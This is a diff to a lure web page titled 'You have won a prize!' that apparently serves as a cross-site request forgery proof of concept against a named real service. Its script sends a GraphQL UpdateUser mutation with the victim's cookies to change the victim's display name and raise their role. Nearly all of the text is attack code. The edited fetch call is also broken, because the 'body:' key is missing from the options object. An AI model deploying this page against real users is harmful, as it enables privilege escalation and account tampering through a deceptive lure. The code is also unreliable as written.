@@ -3,11 +3,35 @@
     <h1>You have won a prize!</h1>
     <!-- The form submits to the vulnerable website -->
     <script>
+      
+const GRAPHQL_MUTATION = {
+  operationName: "UpdateUser",
+  variables: {
+    user_id: VICTIM_USER_ID,
+    display_name: ATTACKER_DISPLAY_NAME,
+    role: ESCALATED_ROLE,
+    roles: [ESCALATED_ROLE]
+  },
+  query: `mutation UpdateUser($user_id: ID!, $display_name: String!, $role: UserRole!, $roles: [UserRole!]!) {
+  update_user(
+    input: {user_id: $user_id, display_name: $display_name, role: $role, roles: $roles}
+  ) {
+    __typename
+    user {
+      id
+      display_name
+      role
+      __typename
+    }
+  }
+}`
+};
+      
 fetch("https://app.lightspark.com/graphql/frontend?n=UpdateUser", {
   method: "POST",
   credentials: "include",
   headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({...your payload...})
+  JSON.stringify(GRAPHQL_MUTATION) 
 });
 </script>
   </body>
